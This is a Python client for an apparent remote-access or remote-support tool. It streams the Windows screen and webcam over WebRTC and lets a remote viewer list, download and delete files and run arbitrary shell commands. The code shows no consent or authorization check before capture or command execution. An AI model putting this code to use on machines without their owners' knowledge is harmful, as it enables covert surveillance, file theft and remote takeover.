import asyncio
import json
import socketio
import cv2
import numpy as np
import mss
from av import VideoFrame
from aiortc import RTCPeerConnection, RTCSessionDescription, VideoStreamTrack, AudioStreamTrack, RTCIceCandidate
import sounddevice as sd
import av
import pyaudio
import fractions
import os
from config import API_BASE
import win32gui
import win32ui
import win32con
import win32api
from PIL import ImageGrab
from controllers.file_controller import get_file_structure, send_chunks, delete_files, get_full_paths
from controllers.terminal_controller import cmd, cd

print(sd.query_devices())
print(sd.query_hostapis())
print(sd.default.hostapi)

class TestAudioTrack(AudioStreamTrack):
    def __init__(self):
        super().__init__()
        self.counter = 0
        self.sample_rate = 44100
        self.samples_per_frame = 1024
        print("🧪 Test audio track initialized")

    async def recv(self):
        self.counter += 1
        print(f"🧪 Test audio frame #{self.counter}")
        
        # Use the proper timestamp method from parent class
        pts, time_base = await self.next_timestamp()
        
        # Generate simple tone
        import math
        samples = self.samples_per_frame
        frequency = 440  # A note
        
        audio_data = []
        for i in range(samples):
            # Add counter to make the tone change over time
            phase = (self.counter * samples + i) / self.sample_rate
            value = int(16383 * math.sin(2 * math.pi * frequency * phase))
            audio_data.append(value)
        
        audio_array = np.array(audio_data, dtype=np.int16).reshape(1, -1)
        
        frame = av.AudioFrame.from_ndarray(
            audio_array,
            format='s16',
            layout='mono'
        )
        frame.sample_rate = self.sample_rate
        frame.pts = pts
        frame.time_base = time_base
        
        return frame

# class MicrophoneStreamTrack(MediaStreamTrack):
#     kind = "audio"

#     def __init__(self):
#         super().__init__()  # initialize MediaStreamTrack
#         self.p = pyaudio.PyAudio()
#         self.stream = self.p.open(format=pyaudio.paInt16,
#                                   channels=1,
#                                   rate=44100,
#                                   input=True,
#                                   frames_per_buffer=1024)
#         self.sample_rate = 44100

#     async def recv(self):
#         audio_data = self.stream.read(1024, exception_on_overflow=False)
#         frame = av.AudioFrame.from_ndarray(
#             np.frombuffer(audio_data, dtype=np.int16),
#             format='s16',
#             layout='mono'
#         )
#         frame.sample_rate = self.sample_rate
#         print("📢 Sending audio frame")
#         return frame

# class SystemAudioStreamTrack(AudioStreamTrack):
#     def __init__(self, samplerate=48000, channels=2):
#         super().__init__()
#         self.samplerate = samplerate
#         self.channels = channels
#         self.device = 17  # 🎯 Index for 'Stereo Mix'
#         self.stream = sd.InputStream(
#             device=self.device,
#             samplerate=self.samplerate,
#             channels=self.channels,
#             dtype='int16'
#         )
#         self.stream.start()
#         self.samples_per_frame = int(self.samplerate * 0.02)  # 20ms
#         self.pts = 0
#         self.time_base = fractions.Fraction(1, self.samplerate)

#     async def recv(self):
#         print("📢 Sending audio frame")
#         audio, _ = self.stream.read(self.samples_per_frame)
#         frame = AudioFrame(format="s16", layout="stereo", samples=self.samples_per_frame)
#         for i in range(self.channels):
#             frame.planes[i].update(audio[:, i].tobytes())

#         frame.pts = self.pts
#         frame.sample_rate = self.samplerate
#         frame.time_base = self.time_base
#         self.pts += self.samples_per_frame
#         return frame

class WebcamStreamTrack(VideoStreamTrack):
    paused = False
    def __init__(self):
        super().__init__()
        self.cap = cv2.VideoCapture(0)

    async def recv(self):
        # print("📸 Sending webcam frame")
        if self.paused:
            # Send 1x1 pixel frame continuously when paused
            pts, time_base = await self.next_timestamp()
            tiny_frame = np.zeros((1, 1, 3), np.uint8)  # 1x1 pixel
            frame = VideoFrame.from_ndarray(tiny_frame, format="bgr24")
            frame.pts = pts
            frame.time_base = time_base
            # print("⏸️ Sending paused web frame (1x1 pixel)")
            return frame
        # print("📸 Sending webcam frame")
        pts, time_base = await self.next_timestamp()
        ret, frame = self.cap.read()
        if not ret:
            frame = np.zeros((480, 640, 3), np.uint8)
        video_frame = VideoFrame.from_ndarray(frame, format="bgr24")
        video_frame.pts = pts
        video_frame.time_base = time_base
        return video_frame
    
    @classmethod
    def pause(cls):
        cls.paused = True
        print("⏸️ WebCam track paused")
    
    @classmethod
    def resume(cls):
        cls.paused = False
        print("▶️ WebCam track resumed")

class ScreenStreamTrack(VideoStreamTrack):
    paused = False
    def __init__(self):
        super().__init__()
        self.is_screen_track = True

    async def recv(self):
        if self.paused:
            # print("⏸️ Sending paused screen frame (1x1 pixel)")
            pts, time_base = await self.next_timestamp()
            tiny_frame = np.zeros((1, 1, 3), np.uint8)
            frame = VideoFrame.from_ndarray(tiny_frame, format="bgr24")
            frame.pts = pts
            frame.time_base = time_base
            return frame
        
        global count
        # print(f"🖥️ Sending screen frame #{count}")
        count += 1
        pts, time_base = await self.next_timestamp()
        
        img = self.capture_screen_with_cursor()
        
        frame = VideoFrame.from_ndarray(img, format="bgr24")
        frame.pts = pts
        frame.time_base = time_base
        return frame
    
    def capture_screen_with_cursor(self):
        try:
            hdesktop = win32gui.GetDesktopWindow()
            width = win32api.GetSystemMetrics(win32con.SM_CXSCREEN)
            height = win32api.GetSystemMetrics(win32con.SM_CYSCREEN)
            
            desktop_dc = win32gui.GetWindowDC(hdesktop)
            img_dc = win32ui.CreateDCFromHandle(desktop_dc)
            mem_dc = img_dc.CreateCompatibleDC()
            
            screenshot = win32ui.CreateBitmap()
            screenshot.CreateCompatibleBitmap(img_dc, width, height)
            mem_dc.SelectObject(screenshot)
            
            mem_dc.BitBlt((0, 0), (width, height), img_dc, (0, 0), win32con.SRCCOPY)
            
            try:
                cursor_info = win32gui.GetCursorInfo()
                if cursor_info[1]:
                    cursor_x, cursor_y = cursor_info[2]
                    cursor_handle = cursor_info[1]
                    
                    win32gui.DrawIcon(mem_dc.GetSafeHdc(), cursor_x, cursor_y, cursor_handle)
            except Exception as cursor_error:
                print(f"Could not draw cursor: {cursor_error}")
            
            bmpstr = screenshot.GetBitmapBits(True)
            img = np.frombuffer(bmpstr, dtype='uint8')
            img.shape = (height, width, 4)
            img = img[:, :, :3]
            
            mem_dc.DeleteDC()
            win32gui.ReleaseDC(hdesktop, desktop_dc)
            return img
            
        except Exception as e:
            print(f"Failed to capture with cursor: {e}")
            screenshot = ImageGrab.grab()
            img = np.array(screenshot)
            img = cv2.cvtColor(img, cv2.COLOR_RGB2BGR)
            return img
    
    @classmethod
    def pause(cls):
        cls.paused = True
        print("⏸️ Screen track paused")
    
    @classmethod
    def resume(cls):
        cls.paused = False
        print("▶️ Screen track resumed")

    def stop(self):
        super().stop()

sio = socketio.AsyncClient()
pc = None
udp_channel = None
tcp_channel = None
count = 0
file_stream = None


async def pause_track(track_name):  
    if not pc:
        print("PeerConnection is not active.")
        return

    for sender in pc.getSenders():
        if sender.track:
            if (
                track_name == "screen" and isinstance(sender.track, ScreenStreamTrack)
            ):
                print("🖥️ Pausing screen track")
                sender.track.pause()
                await sio.emit("screen_paused")
                break

            elif (
                track_name == "webcam" and isinstance(sender.track, WebcamStreamTrack)
            ):
                print("📷 Pausing webcam track")
                sender.track.pause()
                await sio.emit("webcam_paused")
                break

            elif (
                track_name == "audio" and isinstance(sender.track, TestAudioTrack)
            ):
                print("🔈 Pausing audio track")
                sender.track.pause()
                await sio.emit("audio_paused")
                break


async def resume_track(track_name):
    if not pc:
        print("PeerConnection is not active.")
        return

    for sender in pc.getSenders():
        if sender.track:
            if (
                track_name == "screen" and isinstance(sender.track, ScreenStreamTrack)
            ):
                print("🖥️ Resuming screen track")
                sender.track.resume()
                await sio.emit("screen_resumed")
                break

            elif (
                track_name == "webcam" and isinstance(sender.track, WebcamStreamTrack)
            ):
                print("📷 Resuming webcam track")
                sender.track.resume()
                await sio.emit("webcam_resumed")
                break

            elif (
                track_name == "audio" and isinstance(sender.track, TestAudioTrack)
            ):
                print("🔈 Resuming audio track")
                sender.track.resume()
                await sio.emit("audio_resumed")
                break

def handle_udp_message(message):
    print("📨 Received from UDP channel:", message)
    
def handle_tcp_message(message):
    global file_stream
    print("📨 Received from TCP channel:", message)
    if isinstance(message, str):
        try:
            message = json.loads(message)
        except json.JSONDecodeError:
            print(f"Invalid JSON: {message}")
            return
    if message.get("type") == "get_files":
        response = get_file_structure(message.get("path", []))
        tcp_channel.send(json.dumps({"type":"get_files_response", "files": response, "path": message.get("path", [])}))
        print(f"📂 Sent files for path {message.get('path', [])} to browser: {response}")
    elif message.get("type") == "download_files":
        files = message.get("files", [])
        path = message.get("path", [])

        full_paths = get_full_paths(path, files)
        file_stream = send_chunks(full_paths, tcp_channel)
        tcp_channel.send(next(file_stream))
    elif message.get("type") == "cancel_download":
        print("Download cancelled by user")
        file_stream = None
    elif message.get("type") == "zip_ack":
        try:
            if file_stream is None:
                print("No active file stream to send")
                return
            tcp_channel.send(next(file_stream))
        except StopIteration:
            print("✅ All chunks sent successfully")
    elif message.get("type") == "delete_files":
        files = message.get("files", [])
        path = message.get("path", [])
        full_paths = get_full_paths(path, files)
        delete_files(full_paths)
        response = get_file_structure(path)
        tcp_channel.send(json.dumps({"type":"delete_files_response", "files": response, "path": path}))
    elif message.get("type") == "execute_command":
        command = message.get("command", "")
        if command:
            print(f"Executing command: {command}")
            if command.startswith("cd "):
                path = command[3:].strip()
                output = cd(path)
                if output["success"]:
                    print(f"Changed directory to: {output['path']}")
                    tcp_channel.send(json.dumps({"type": "terminal_cd", "path": output["path"], "command": command}))
                else:
                    print(f"Error changing directory: {output['message']}")
                    tcp_channel.send(json.dumps({"type": "terminal_error", "message": output["message"], "command": command}))
            else:
                output = cmd(command)
                if output["success"]:
                    print(f"Command executed successfully: {output['output']}")
                    tcp_channel.send(json.dumps({"type": "terminal_cmd", "output": output["output"], "command": command}))
                else:
                    print(f"Error executing command: {output['message']}")
                    tcp_channel.send(json.dumps({"type": "terminal_error", "message": output["message"], "command": command}))
                    print(1)
        else:
            print("No command provided to execute")
    elif message.get("type") == "get_user_and_path":
        tcp_channel.send(json.dumps({
            "type": "user_and_path",
            "user": os.getlogin(),
            "path": os.getcwd()
        }))

@sio.event
async def connect():
    print("✅ Connected to signaling server")

@sio.on("initiate-webrtc")
async def initiate_webrtc():
    global pc, udp_channel, tcp_channel, handle_udp_message, handle_tcp_message
    pc = RTCPeerConnection()
    print("▶️ Received start signal from viewer")

    @pc.on("icecandidate")
    async def on_icecandidate(candidate):
        if candidate:
            print("🧊 Sending ICE candidate to viewer")
            await sio.emit("webrtc-ice-candidate", {
                "ice": {
                    "candidate": candidate.candidate,
                    "sdpMLineIndex": candidate.sdpMLineIndex,
                    "sdpMid": candidate.sdpMid,
                }
            })
    
    @pc.on("connectionstatechange")
    async def on_connectionstatechange():
        print(f"🔗 Connection state: {pc.connectionState}")
    
    @pc.on("iceconnectionstatechange")
    async def on_iceconnectionstatechange():
        print(f"🧊 ICE connection state: {pc.iceConnectionState}")

    system_audio_track = TestAudioTrack()
    webcam_track = WebcamStreamTrack()
    screen_track = ScreenStreamTrack()
    pc.addTrack(screen_track)
    pc.addTrack(webcam_track)
    pc.addTrack(system_audio_track)

    udp_channel = pc.createDataChannel("udp")
    tcp_channel = pc.createDataChannel("tcp", ordered=True, maxRetransmits=None)

    @tcp_channel.on("open")
    def on_tcp_open():
        print("✅ TCP Data channel opened")

    @tcp_channel.on("message")
    def on_tcp_message(message):
        handle_tcp_message(message)
        # tcp_channel.send("Hello from TCP channel!")

    @tcp_channel.on("error")
    def on_tcp_error(error):
        print(f"❌ TCP channel error: {error}")

    @tcp_channel.on("close")
    def on_tcp_close():
        print("❌ TCP channel closed")

    @udp_channel.on("open")
    def on_udp_open():
        print("✅ UDP Data channel opened")

    @udp_channel.on("message")
    def on_udp_message(message):
        handle_udp_message(message)
        # udp_channel.send("Hello from UDP channel!")

    @udp_channel.on("error")
    def on_udp_error(error):
        print(f"❌ UDP channel error: {error}")
    
    @udp_channel.on("close")
    def on_udp_close():
        print("❌ UDP channel closed")

    offer = await pc.createOffer()
    await pc.setLocalDescription(offer)

    await sio.emit("webrtc-offer", {
        "offer": {
        "sdp": pc.localDescription.sdp,
        "type": pc.localDescription.type,
        }
    })
    print(f"📨 Sent offer")

@sio.on("stop_screen")
async def on_stop_screen():
    print("🖥️ Received stop screen signal from viewer")
    
    # Find and pause the screen track
    for sender in pc.getSenders():
        if sender.track and hasattr(sender.track, 'sct'):
            print("🖥️ Pausing screen track")
            sender.track.pause()
            break
    
    # Notify viewer that screen has stopped
    await sio.emit("screen_stopped")
    print("✅ Screen share paused")

@sio.on("resume_screen")
async def on_resume_screen():
    print("🖥️ Received resume screen signal from viewer")
    
    # Find and resume the screen track
    for sender in pc.getSenders():
        if sender.track and hasattr(sender.track, 'sct'):
            print("🖥️ Resuming screen track")
            sender.track.resume()
            break
    
    # Notify viewer that screen has resumed
    await sio.emit("screen_resumed")
    print("✅ Screen share resumed")

@sio.on("stop-webrtc")
async def stop_webrtc():
    global pc, udp_channel, tcp_channel
    print("🔴 Received stop signal from viewer")
    
    if udp_channel:
        udp_channel.close()
        udp_channel = None
    if tcp_channel:
        tcp_channel.close()
        tcp_channel = None
    
    if pc:
        await pc.close()
        pc = None
    
    await sio.emit("stopped-webrtc")

@sio.on("webrtc-answer")
async def on_answer(data):
    print("✅ Got answer")
    await pc.setRemoteDescription(RTCSessionDescription(sdp=data["answer"]["sdp"], type=data["answer"]["type"]))

@sio.on("webrtc-ice-candidate")
async def webrtc_ice_candidate(data):
    global pc
    print("🧊 Received ICE candidate from browser")
    
    if pc and data.get("ice"):
        try:
            ice_data = data["ice"]
            candidate_string = ice_data["candidate"]
            
            # Parse the candidate string manually
            parts = candidate_string.split()
            
            if len(parts) >= 8:
                foundation = parts[0].split(':')[1]  # Remove "candidate:" prefix
                component = int(parts[1])
                protocol = parts[2].lower()
                priority = int(parts[3])
                ip = parts[4]
                port = int(parts[5])
                
                # Find the type (host, srflx, relay, etc.)
                type_value = "host"  # default
                for i, part in enumerate(parts):
                    if part == "typ" and i + 1 < len(parts):
                        type_value = parts[i + 1]
                        break
                
                # Create RTCIceCandidate with parsed values
                candidate = RTCIceCandidate(
                    component=component,
                    foundation=foundation,
                    ip=ip,
                    port=port,
                    priority=priority,
                    protocol=protocol,
                    type=type_value
                )
                
                # Set the SDP fields
                candidate.sdpMid = ice_data.get("sdpMid")
                candidate.sdpMLineIndex = ice_data.get("sdpMLineIndex")
                
                await pc.addIceCandidate(candidate)
                print("✅ Added ICE candidate from browser")
            else:
                print(f"⚠️ Invalid candidate format: {candidate_string}")
                
        except Exception as e:
            print(f"❌ Failed to add ICE candidate: {e}")
            print(f"Raw candidate string: {data['ice']['candidate']}")
            
            # Check if it's an end-of-candidates signal
            if not data['ice']['candidate'].strip():
                print("🧊 End of ICE candidates")
                return
    else:
        print("⚠️ No peer connection or invalid ICE candidate data")

@sio.on("from-user")
async def from_user(data):
    print(f"📨 Received message from user: {data['message']}")
    if data["message"] == "pause_screen":
        await pause_track("screen")
    elif data["message"] == "resume_screen":
        await resume_track("screen")
    elif data["message"] == "pause_webcam":
        await pause_track("webcam")
    elif data["message"] == "resume_webcam":
        await resume_track("webcam")
    elif data["message"] == "pause_audio":
        await pause_track("audio")
    elif data["message"] == "resume_audio":
        await resume_track("audio")

async def connect_socket(uuid):
    await sio.connect(API_BASE, auth={"type": "device", "deviceId": uuid})
    await sio.wait()

async def disconnect_socket():
    await sio.disconnect()